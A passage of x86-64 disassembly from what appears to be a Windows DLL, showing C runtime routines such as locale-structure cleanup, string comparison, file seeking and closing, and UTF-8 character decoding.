   18000d838:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   18000d83d:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   18000d842:	48 83 c4 20          	add    $0x20,%rsp
   18000d846:	41 5f                	pop    %r15
   18000d848:	41 5e                	pop    %r14
   18000d84a:	41 5d                	pop    %r13
   18000d84c:	41 5c                	pop    %r12
   18000d84e:	5f                   	pop    %rdi
   18000d84f:	c3                   	ret
   18000d850:	49 8b dd             	mov    %r13,%rbx
   18000d853:	44 38 2f             	cmp    %r13b,(%rdi)
   18000d856:	75 08                	jne    0x18000d860
   18000d858:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000d85e:	eb 1d                	jmp    0x18000d87d
   18000d860:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   18000d864:	75 08                	jne    0x18000d86e
   18000d866:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000d86c:	eb 0f                	jmp    0x18000d87d
   18000d86e:	8a 47 02             	mov    0x2(%rdi),%al
   18000d871:	f6 d8                	neg    %al
   18000d873:	4d 1b c0             	sbb    %r8,%r8
   18000d876:	49 f7 d8             	neg    %r8
   18000d879:	49 83 c0 03          	add    $0x3,%r8
   18000d87d:	4d 8b cc             	mov    %r12,%r9
   18000d880:	48 8b d7             	mov    %rdi,%rdx
   18000d883:	33 c9                	xor    %ecx,%ecx
   18000d885:	e8 2a 05 00 00       	call   0x18000ddb4
   18000d88a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000d88e:	74 99                	je     0x18000d829
   18000d890:	48 85 c0             	test   %rax,%rax
   18000d893:	74 83                	je     0x18000d818
   18000d895:	48 83 f8 04          	cmp    $0x4,%rax
   18000d899:	75 03                	jne    0x18000d89e
   18000d89b:	48 ff c3             	inc    %rbx
   18000d89e:	48 03 f8             	add    %rax,%rdi
   18000d8a1:	48 ff c3             	inc    %rbx
   18000d8a4:	eb ad                	jmp    0x18000d853
   18000d8a6:	cc                   	int3
   18000d8a7:	cc                   	int3
   18000d8a8:	48 85 c9             	test   %rcx,%rcx
   18000d8ab:	0f 84 00 01 00 00    	je     0x18000d9b1
   18000d8b1:	53                   	push   %rbx
   18000d8b2:	48 83 ec 20          	sub    $0x20,%rsp
   18000d8b6:	48 8b d9             	mov    %rcx,%rbx
   18000d8b9:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   18000d8bd:	48 3b 0d 74 cf 00 00 	cmp    0xcf74(%rip),%rcx        # 0x18001a838
   18000d8c4:	74 05                	je     0x18000d8cb
   18000d8c6:	e8 c9 a9 ff ff       	call   0x180008294
   18000d8cb:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   18000d8cf:	48 3b 0d 6a cf 00 00 	cmp    0xcf6a(%rip),%rcx        # 0x18001a840
   18000d8d6:	74 05                	je     0x18000d8dd
   18000d8d8:	e8 b7 a9 ff ff       	call   0x180008294
   18000d8dd:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000d8e1:	48 3b 0d 60 cf 00 00 	cmp    0xcf60(%rip),%rcx        # 0x18001a848
   18000d8e8:	74 05                	je     0x18000d8ef
   18000d8ea:	e8 a5 a9 ff ff       	call   0x180008294
   18000d8ef:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000d8f3:	48 3b 0d 56 cf 00 00 	cmp    0xcf56(%rip),%rcx        # 0x18001a850
   18000d8fa:	74 05                	je     0x18000d901
   18000d8fc:	e8 93 a9 ff ff       	call   0x180008294
   18000d901:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   18000d905:	48 3b 0d 4c cf 00 00 	cmp    0xcf4c(%rip),%rcx        # 0x18001a858
   18000d90c:	74 05                	je     0x18000d913
   18000d90e:	e8 81 a9 ff ff       	call   0x180008294
   18000d913:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   18000d917:	48 3b 0d 42 cf 00 00 	cmp    0xcf42(%rip),%rcx        # 0x18001a860
   18000d91e:	74 05                	je     0x18000d925
   18000d920:	e8 6f a9 ff ff       	call   0x180008294
   18000d925:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   18000d929:	48 3b 0d 38 cf 00 00 	cmp    0xcf38(%rip),%rcx        # 0x18001a868
   18000d930:	74 05                	je     0x18000d937
   18000d932:	e8 5d a9 ff ff       	call   0x180008294
   18000d937:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   18000d93b:	48 3b 0d 46 cf 00 00 	cmp    0xcf46(%rip),%rcx        # 0x18001a888
   18000d942:	74 05                	je     0x18000d949
   18000d944:	e8 4b a9 ff ff       	call   0x180008294
   18000d949:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   18000d94d:	48 3b 0d 3c cf 00 00 	cmp    0xcf3c(%rip),%rcx        # 0x18001a890
   18000d954:	74 05                	je     0x18000d95b
   18000d956:	e8 39 a9 ff ff       	call   0x180008294
   18000d95b:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   18000d95f:	48 3b 0d 32 cf 00 00 	cmp    0xcf32(%rip),%rcx        # 0x18001a898
   18000d966:	74 05                	je     0x18000d96d
   18000d968:	e8 27 a9 ff ff       	call   0x180008294
   18000d96d:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   18000d974:	48 3b 0d 25 cf 00 00 	cmp    0xcf25(%rip),%rcx        # 0x18001a8a0
   18000d97b:	74 05                	je     0x18000d982
   18000d97d:	e8 12 a9 ff ff       	call   0x180008294
   18000d982:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   18000d989:	48 3b 0d 18 cf 00 00 	cmp    0xcf18(%rip),%rcx        # 0x18001a8a8
   18000d990:	74 05                	je     0x18000d997
   18000d992:	e8 fd a8 ff ff       	call   0x180008294
   18000d997:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   18000d99e:	48 3b 0d 0b cf 00 00 	cmp    0xcf0b(%rip),%rcx        # 0x18001a8b0
   18000d9a5:	74 05                	je     0x18000d9ac
   18000d9a7:	e8 e8 a8 ff ff       	call   0x180008294
   18000d9ac:	48 83 c4 20          	add    $0x20,%rsp
   18000d9b0:	5b                   	pop    %rbx
   18000d9b1:	c3                   	ret
   18000d9b2:	cc                   	int3
   18000d9b3:	cc                   	int3
   18000d9b4:	48 85 c9             	test   %rcx,%rcx
   18000d9b7:	74 66                	je     0x18000da1f
   18000d9b9:	53                   	push   %rbx
   18000d9ba:	48 83 ec 20          	sub    $0x20,%rsp
   18000d9be:	48 8b d9             	mov    %rcx,%rbx
   18000d9c1:	48 8b 09             	mov    (%rcx),%rcx
   18000d9c4:	48 3b 0d 55 ce 00 00 	cmp    0xce55(%rip),%rcx        # 0x18001a820
   18000d9cb:	74 05                	je     0x18000d9d2
   18000d9cd:	e8 c2 a8 ff ff       	call   0x180008294
   18000d9d2:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000d9d6:	48 3b 0d 4b ce 00 00 	cmp    0xce4b(%rip),%rcx        # 0x18001a828
   18000d9dd:	74 05                	je     0x18000d9e4
   18000d9df:	e8 b0 a8 ff ff       	call   0x180008294
   18000d9e4:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000d9e8:	48 3b 0d 41 ce 00 00 	cmp    0xce41(%rip),%rcx        # 0x18001a830
   18000d9ef:	74 05                	je     0x18000d9f6
   18000d9f1:	e8 9e a8 ff ff       	call   0x180008294
   18000d9f6:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   18000d9fa:	48 3b 0d 77 ce 00 00 	cmp    0xce77(%rip),%rcx        # 0x18001a878
   18000da01:	74 05                	je     0x18000da08
   18000da03:	e8 8c a8 ff ff       	call   0x180008294
   18000da08:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   18000da0c:	48 3b 0d 6d ce 00 00 	cmp    0xce6d(%rip),%rcx        # 0x18001a880
   18000da13:	74 05                	je     0x18000da1a
   18000da15:	e8 7a a8 ff ff       	call   0x180008294
   18000da1a:	48 83 c4 20          	add    $0x20,%rsp
   18000da1e:	5b                   	pop    %rbx
   18000da1f:	c3                   	ret
   18000da20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000da25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000da2a:	57                   	push   %rdi
   18000da2b:	48 83 ec 20          	sub    $0x20,%rsp
   18000da2f:	33 ff                	xor    %edi,%edi
   18000da31:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   18000da35:	48 8b d9             	mov    %rcx,%rbx
   18000da38:	48 8b f2             	mov    %rdx,%rsi
   18000da3b:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   18000da42:	ff ff 1f 
   18000da45:	48 23 f1             	and    %rcx,%rsi
   18000da48:	48 3b d8             	cmp    %rax,%rbx
   18000da4b:	48 0f 47 f7          	cmova  %rdi,%rsi
   18000da4f:	48 85 f6             	test   %rsi,%rsi
   18000da52:	74 14                	je     0x18000da68
   18000da54:	48 8b 0b             	mov    (%rbx),%rcx
   18000da57:	e8 38 a8 ff ff       	call   0x180008294
   18000da5c:	48 ff c7             	inc    %rdi
   18000da5f:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   18000da63:	48 3b fe             	cmp    %rsi,%rdi
   18000da66:	75 ec                	jne    0x18000da54
   18000da68:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000da6d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000da72:	48 83 c4 20          	add    $0x20,%rsp
   18000da76:	5f                   	pop    %rdi
   18000da77:	c3                   	ret
   18000da78:	48 85 c9             	test   %rcx,%rcx
   18000da7b:	0f 84 fe 00 00 00    	je     0x18000db7f
   18000da81:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000da86:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000da8b:	56                   	push   %rsi
   18000da8c:	48 83 ec 20          	sub    $0x20,%rsp
   18000da90:	bd 07 00 00 00       	mov    $0x7,%ebp
   18000da95:	48 8b d9             	mov    %rcx,%rbx
   18000da98:	8b d5                	mov    %ebp,%edx
   18000da9a:	e8 81 ff ff ff       	call   0x18000da20
   18000da9f:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   18000daa3:	8b d5                	mov    %ebp,%edx
   18000daa5:	e8 76 ff ff ff       	call   0x18000da20
   18000daaa:	8d 75 05             	lea    0x5(%rbp),%esi
   18000daad:	8b d6                	mov    %esi,%edx
   18000daaf:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   18000dab3:	e8 68 ff ff ff       	call   0x18000da20
   18000dab8:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   18000dabf:	8b d6                	mov    %esi,%edx
   18000dac1:	e8 5a ff ff ff       	call   0x18000da20
   18000dac6:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   18000dacd:	8d 55 fb             	lea    -0x5(%rbp),%edx
   18000dad0:	e8 4b ff ff ff       	call   0x18000da20
   18000dad5:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   18000dadc:	e8 b3 a7 ff ff       	call   0x180008294
   18000dae1:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   18000dae8:	e8 a7 a7 ff ff       	call   0x180008294
   18000daed:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   18000daf4:	e8 9b a7 ff ff       	call   0x180008294
   18000daf9:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   18000db00:	8b d5                	mov    %ebp,%edx
   18000db02:	e8 19 ff ff ff       	call   0x18000da20
   18000db07:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   18000db0e:	8b d5                	mov    %ebp,%edx
   18000db10:	e8 0b ff ff ff       	call   0x18000da20
   18000db15:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   18000db1c:	8b d6                	mov    %esi,%edx
   18000db1e:	e8 fd fe ff ff       	call   0x18000da20
   18000db23:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   18000db2a:	8b d6                	mov    %esi,%edx
   18000db2c:	e8 ef fe ff ff       	call   0x18000da20
   18000db31:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   18000db38:	8d 55 fb             	lea    -0x5(%rbp),%edx
   18000db3b:	e8 e0 fe ff ff       	call   0x18000da20
   18000db40:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   18000db47:	e8 48 a7 ff ff       	call   0x180008294
   18000db4c:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   18000db53:	e8 3c a7 ff ff       	call   0x180008294
   18000db58:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   18000db5f:	e8 30 a7 ff ff       	call   0x180008294
   18000db64:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   18000db6b:	e8 24 a7 ff ff       	call   0x180008294
   18000db70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000db75:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000db7a:	48 83 c4 20          	add    $0x20,%rsp
   18000db7e:	5e                   	pop    %rsi
   18000db7f:	c3                   	ret
   18000db80:	33 c0                	xor    %eax,%eax
   18000db82:	38 01                	cmp    %al,(%rcx)
   18000db84:	74 0e                	je     0x18000db94
   18000db86:	48 3b c2             	cmp    %rdx,%rax
   18000db89:	74 09                	je     0x18000db94
   18000db8b:	48 ff c0             	inc    %rax
   18000db8e:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   18000db92:	75 f2                	jne    0x18000db86
   18000db94:	c3                   	ret
   18000db95:	cc                   	int3
   18000db96:	cc                   	int3
   18000db97:	cc                   	int3
   18000db98:	4c 8b da             	mov    %rdx,%r11
   18000db9b:	4c 8b d1             	mov    %rcx,%r10
   18000db9e:	4d 85 c0             	test   %r8,%r8
   18000dba1:	75 03                	jne    0x18000dba6
   18000dba3:	33 c0                	xor    %eax,%eax
   18000dba5:	c3                   	ret
   18000dba6:	41 0f b7 0a          	movzwl (%r10),%ecx
   18000dbaa:	4d 8d 52 02          	lea    0x2(%r10),%r10
   18000dbae:	41 0f b7 13          	movzwl (%r11),%edx
   18000dbb2:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   18000dbb6:	8d 41 bf             	lea    -0x41(%rcx),%eax
   18000dbb9:	83 f8 19             	cmp    $0x19,%eax
   18000dbbc:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   18000dbc0:	8d 42 bf             	lea    -0x41(%rdx),%eax
   18000dbc3:	44 0f 47 c9          	cmova  %ecx,%r9d
   18000dbc7:	83 f8 19             	cmp    $0x19,%eax
   18000dbca:	8d 4a 20             	lea    0x20(%rdx),%ecx
   18000dbcd:	41 8b c1             	mov    %r9d,%eax
   18000dbd0:	0f 47 ca             	cmova  %edx,%ecx
   18000dbd3:	2b c1                	sub    %ecx,%eax
   18000dbd5:	75 0b                	jne    0x18000dbe2
   18000dbd7:	45 85 c9             	test   %r9d,%r9d
   18000dbda:	74 06                	je     0x18000dbe2
   18000dbdc:	49 83 e8 01          	sub    $0x1,%r8
   18000dbe0:	75 c4                	jne    0x18000dba6
   18000dbe2:	c3                   	ret
   18000dbe3:	cc                   	int3
   18000dbe4:	8b 05 b6 e0 00 00    	mov    0xe0b6(%rip),%eax        # 0x18001bca0
   18000dbea:	c3                   	ret
   18000dbeb:	cc                   	int3
   18000dbec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000dbf1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000dbf6:	57                   	push   %rdi
   18000dbf7:	48 83 ec 20          	sub    $0x20,%rsp
   18000dbfb:	48 63 d9             	movslq %ecx,%rbx
   18000dbfe:	41 8b f8             	mov    %r8d,%edi
   18000dc01:	8b cb                	mov    %ebx,%ecx
   18000dc03:	48 8b f2             	mov    %rdx,%rsi
   18000dc06:	e8 65 eb ff ff       	call   0x18000c770
   18000dc0b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000dc0f:	75 11                	jne    0x18000dc22
   18000dc11:	e8 e6 a5 ff ff       	call   0x1800081fc
   18000dc16:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000dc1c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000dc20:	eb 53                	jmp    0x18000dc75
   18000dc22:	44 8b cf             	mov    %edi,%r9d
   18000dc25:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   18000dc2a:	48 8b d6             	mov    %rsi,%rdx
   18000dc2d:	48 8b c8             	mov    %rax,%rcx
   18000dc30:	ff 15 ea 25 00 00    	call   *0x25ea(%rip)        # 0x180010220
   18000dc36:	85 c0                	test   %eax,%eax
   18000dc38:	75 0f                	jne    0x18000dc49
   18000dc3a:	ff 15 80 24 00 00    	call   *0x2480(%rip)        # 0x1800100c0
   18000dc40:	8b c8                	mov    %eax,%ecx
   18000dc42:	e8 45 a5 ff ff       	call   0x18000818c
   18000dc47:	eb d3                	jmp    0x18000dc1c
   18000dc49:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000dc4e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000dc52:	74 c8                	je     0x18000dc1c
   18000dc54:	48 8b d3             	mov    %rbx,%rdx
   18000dc57:	4c 8d 05 d2 db 00 00 	lea    0xdbd2(%rip),%r8        # 0x18001b830
   18000dc5e:	83 e2 3f             	and    $0x3f,%edx
   18000dc61:	48 8b cb             	mov    %rbx,%rcx
   18000dc64:	48 c1 f9 06          	sar    $0x6,%rcx
   18000dc68:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000dc6c:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000dc70:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   18000dc75:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000dc7a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000dc7f:	48 83 c4 20          	add    $0x20,%rsp
   18000dc83:	5f                   	pop    %rdi
   18000dc84:	c3                   	ret
   18000dc85:	cc                   	int3
   18000dc86:	cc                   	int3
   18000dc87:	cc                   	int3
   18000dc88:	e9 5f ff ff ff       	jmp    0x18000dbec
   18000dc8d:	cc                   	int3
   18000dc8e:	cc                   	int3
   18000dc8f:	cc                   	int3
   18000dc90:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   18000dc95:	48 83 ec 28          	sub    $0x28,%rsp
   18000dc99:	e8 9e 08 00 00       	call   0x18000e53c
   18000dc9e:	85 c0                	test   %eax,%eax
   18000dca0:	74 1f                	je     0x18000dcc1
   18000dca2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   18000dca7:	ba 01 00 00 00       	mov    $0x1,%edx
   18000dcac:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000dcb1:	e8 f6 08 00 00       	call   0x18000e5ac
   18000dcb6:	85 c0                	test   %eax,%eax
   18000dcb8:	74 07                	je     0x18000dcc1
   18000dcba:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   18000dcbf:	eb 05                	jmp    0x18000dcc6
   18000dcc1:	b8 ff ff 00 00       	mov    $0xffff,%eax
   18000dcc6:	48 83 c4 28          	add    $0x28,%rsp
   18000dcca:	c3                   	ret
   18000dccb:	cc                   	int3
   18000dccc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000dcd1:	57                   	push   %rdi
   18000dcd2:	48 83 ec 20          	sub    $0x20,%rsp
   18000dcd6:	48 8b d9             	mov    %rcx,%rbx
   18000dcd9:	48 85 c9             	test   %rcx,%rcx
   18000dcdc:	75 15                	jne    0x18000dcf3
   18000dcde:	e8 19 a5 ff ff       	call   0x1800081fc
   18000dce3:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000dce9:	e8 4e 89 ff ff       	call   0x18000663c
   18000dcee:	83 c8 ff             	or     $0xffffffff,%eax
   18000dcf1:	eb 51                	jmp    0x18000dd44
   18000dcf3:	8b 41 14             	mov    0x14(%rcx),%eax
   18000dcf6:	83 cf ff             	or     $0xffffffff,%edi
   18000dcf9:	c1 e8 0d             	shr    $0xd,%eax
   18000dcfc:	a8 01                	test   $0x1,%al
   18000dcfe:	74 3a                	je     0x18000dd3a
   18000dd00:	e8 af cd ff ff       	call   0x18000aab4
   18000dd05:	48 8b cb             	mov    %rbx,%rcx
   18000dd08:	8b f8                	mov    %eax,%edi
   18000dd0a:	e8 f9 f8 ff ff       	call   0x18000d608
   18000dd0f:	48 8b cb             	mov    %rbx,%rcx
   18000dd12:	e8 51 d2 ff ff       	call   0x18000af68
   18000dd17:	8b c8                	mov    %eax,%ecx
   18000dd19:	e8 c2 09 00 00       	call   0x18000e6e0
   18000dd1e:	85 c0                	test   %eax,%eax
   18000dd20:	79 05                	jns    0x18000dd27
   18000dd22:	83 cf ff             	or     $0xffffffff,%edi
   18000dd25:	eb 13                	jmp    0x18000dd3a
   18000dd27:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000dd2b:	48 85 c9             	test   %rcx,%rcx
   18000dd2e:	74 0a                	je     0x18000dd3a
   18000dd30:	e8 5f a5 ff ff       	call   0x180008294
   18000dd35:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   18000dd3a:	48 8b cb             	mov    %rbx,%rcx
   18000dd3d:	e8 02 0b 00 00       	call   0x18000e844
   18000dd42:	8b c7                	mov    %edi,%eax
   18000dd44:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000dd49:	48 83 c4 20          	add    $0x20,%rsp
   18000dd4d:	5f                   	pop    %rdi
   18000dd4e:	c3                   	ret
   18000dd4f:	cc                   	int3
   18000dd50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000dd55:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   18000dd5a:	57                   	push   %rdi
   18000dd5b:	48 83 ec 20          	sub    $0x20,%rsp
   18000dd5f:	48 8b d9             	mov    %rcx,%rbx
   18000dd62:	48 85 c9             	test   %rcx,%rcx
   18000dd65:	75 1e                	jne    0x18000dd85
   18000dd67:	e8 90 a4 ff ff       	call   0x1800081fc
   18000dd6c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000dd72:	e8 c5 88 ff ff       	call   0x18000663c
   18000dd77:	83 c8 ff             	or     $0xffffffff,%eax
   18000dd7a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   18000dd7f:	48 83 c4 20          	add    $0x20,%rsp
   18000dd83:	5f                   	pop    %rdi
   18000dd84:	c3                   	ret
   18000dd85:	8b 41 14             	mov    0x14(%rcx),%eax
   18000dd88:	c1 e8 0c             	shr    $0xc,%eax
   18000dd8b:	a8 01                	test   $0x1,%al
   18000dd8d:	74 07                	je     0x18000dd96
   18000dd8f:	e8 b0 0a 00 00       	call   0x18000e844
   18000dd94:	eb e1                	jmp    0x18000dd77
   18000dd96:	e8 65 cf ff ff       	call   0x18000ad00
   18000dd9b:	90                   	nop
   18000dd9c:	48 8b cb             	mov    %rbx,%rcx
   18000dd9f:	e8 28 ff ff ff       	call   0x18000dccc
   18000dda4:	8b f8                	mov    %eax,%edi
   18000dda6:	48 8b cb             	mov    %rbx,%rcx
   18000dda9:	e8 5e cf ff ff       	call   0x18000ad0c
   18000ddae:	8b c7                	mov    %edi,%eax
   18000ddb0:	eb c8                	jmp    0x18000dd7a
   18000ddb2:	cc                   	int3
   18000ddb3:	cc                   	int3
   18000ddb4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000ddb9:	55                   	push   %rbp
   18000ddba:	56                   	push   %rsi
   18000ddbb:	57                   	push   %rdi
   18000ddbc:	41 56                	push   %r14
   18000ddbe:	41 57                	push   %r15
   18000ddc0:	48 83 ec 40          	sub    $0x40,%rsp
   18000ddc4:	48 8b 05 45 c2 00 00 	mov    0xc245(%rip),%rax        # 0x18001a010
   18000ddcb:	48 33 c4             	xor    %rsp,%rax
   18000ddce:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000ddd3:	45 33 d2             	xor    %r10d,%r10d
   18000ddd6:	4c 8d 1d cb de 00 00 	lea    0xdecb(%rip),%r11        # 0x18001bca8
   18000dddd:	4d 85 c9             	test   %r9,%r9
   18000dde0:	48 8d 3d 9b 2e 00 00 	lea    0x2e9b(%rip),%rdi        # 0x180010c82
   18000dde7:	48 8b c2             	mov    %rdx,%rax
   18000ddea:	4c 8b fa             	mov    %rdx,%r15
   18000dded:	4d 0f 45 d9          	cmovne %r9,%r11
   18000ddf1:	48 85 d2             	test   %rdx,%rdx
   18000ddf4:	41 8d 6a 01          	lea    0x1(%r10),%ebp
   18000ddf8:	48 0f 45 fa          	cmovne %rdx,%rdi
   18000ddfc:	44 8b f5             	mov    %ebp,%r14d
   18000ddff:	4d 0f 45 f0          	cmovne %r8,%r14
   18000de03:	48 f7 d8             	neg    %rax
   18000de06:	48 1b f6             	sbb    %rsi,%rsi
   18000de09:	48 23 f1             	and    %rcx,%rsi
   18000de0c:	4d 85 f6             	test   %r14,%r14
   18000de0f:	75 0c                	jne    0x18000de1d
   18000de11:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   18000de18:	e9 4e 01 00 00       	jmp    0x18000df6b
   18000de1d:	66 45 39 53 06       	cmp    %r10w,0x6(%r11)
   18000de22:	75 68                	jne    0x18000de8c
   18000de24:	44 0f b6 0f          	movzbl (%rdi),%r9d
   18000de28:	48 ff c7             	inc    %rdi
   18000de2b:	45 84 c9             	test   %r9b,%r9b
   18000de2e:	78 17                	js     0x18000de47
   18000de30:	48 85 f6             	test   %rsi,%rsi
   18000de33:	74 03                	je     0x18000de38
   18000de35:	44 89 0e             	mov    %r9d,(%rsi)
   18000de38:	45 84 c9             	test   %r9b,%r9b
   18000de3b:	41 0f 95 c2          	setne  %r10b
   18000de3f:	49 8b c2             	mov    %r10,%rax
   18000de42:	e9 24 01 00 00       	jmp    0x18000df6b
   18000de47:	41 8a c1             	mov    %r9b,%al
   18000de4a:	24 e0                	and    $0xe0,%al
   18000de4c:	3c c0                	cmp    $0xc0,%al
   18000de4e:	75 05                	jne    0x18000de55
   18000de50:	41 b0 02             	mov    $0x2,%r8b
   18000de53:	eb 1e                	jmp    0x18000de73
   18000de55:	41 8a c1             	mov    %r9b,%al
   18000de58:	24 f0                	and    $0xf0,%al
   18000de5a:	3c e0                	cmp    $0xe0,%al
   18000de5c:	75 05                	jne    0x18000de63
   18000de5e:	41 b0 03             	mov    $0x3,%r8b
   18000de61:	eb 10                	jmp    0x18000de73
   18000de63:	41 8a c1             	mov    %r9b,%al
   18000de66:	24 f8                	and    $0xf8,%al
   18000de68:	3c f0                	cmp    $0xf0,%al
   18000de6a:	0f 85 e9 00 00 00    	jne    0x18000df59
   18000de70:	41 b0 04             	mov    $0x4,%r8b
   18000de73:	41 0f b6 c0          	movzbl %r8b,%eax
   18000de77:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000de7c:	2b c8                	sub    %eax,%ecx
   18000de7e:	8b d5                	mov    %ebp,%edx
   18000de80:	d3 e2                	shl    %cl,%edx
   18000de82:	41 8a d8             	mov    %r8b,%bl
   18000de85:	2b d5                	sub    %ebp,%edx
   18000de87:	41 23 d1             	and    %r9d,%edx
   18000de8a:	eb 29                	jmp    0x18000deb5
   18000de8c:	45 8a 43 04          	mov    0x4(%r11),%r8b
   18000de90:	41 8b 13             	mov    (%r11),%edx
   18000de93:	41 8a 5b 06          	mov    0x6(%r11),%bl
   18000de97:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   18000de9b:	3c 02                	cmp    $0x2,%al
   18000de9d:	0f 87 b6 00 00 00    	ja     0x18000df59
   18000dea3:	40 3a dd             	cmp    %bpl,%bl
   18000dea6:	0f 82 ad 00 00 00    	jb     0x18000df59
   18000deac:	41 3a d8             	cmp    %r8b,%bl
   18000deaf:	0f 83 a4 00 00 00    	jae    0x18000df59
   18000deb5:	0f b6 eb             	movzbl %bl,%ebp
   18000deb8:	49 3b ee             	cmp    %r14,%rbp
   18000debb:	44 8b cd             	mov    %ebp,%r9d
   18000debe:	4d 0f 43 ce          	cmovae %r14,%r9
   18000dec2:	eb 1e                	jmp    0x18000dee2
   18000dec4:	0f b6 0f             	movzbl (%rdi),%ecx
   18000dec7:	48 ff c7             	inc    %rdi
   18000deca:	8a c1                	mov    %cl,%al
   18000decc:	24 c0                	and    $0xc0,%al
   18000dece:	3c 80                	cmp    $0x80,%al
   18000ded0:	0f 85 83 00 00 00    	jne    0x18000df59
   18000ded6:	8b c2                	mov    %edx,%eax
   18000ded8:	83 e1 3f             	and    $0x3f,%ecx
   18000dedb:	c1 e0 06             	shl    $0x6,%eax
   18000dede:	8b d1                	mov    %ecx,%edx
   18000dee0:	0b d0                	or     %eax,%edx
   18000dee2:	48 8b c7             	mov    %rdi,%rax
   18000dee5:	49 2b c7             	sub    %r15,%rax
   18000dee8:	49 3b c1             	cmp    %r9,%rax
   18000deeb:	72 d7                	jb     0x18000dec4
   18000deed:	4c 3b cd             	cmp    %rbp,%r9
   18000def0:	73 1c                	jae    0x18000df0e
   18000def2:	41 0f b6 c0          	movzbl %r8b,%eax
   18000def6:	41 2a d9             	sub    %r9b,%bl
   18000def9:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   18000defe:	0f b6 c3             	movzbl %bl,%eax
   18000df01:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   18000df06:	41 89 13             	mov    %edx,(%r11)
   18000df09:	e9 03 ff ff ff       	jmp    0x18000de11
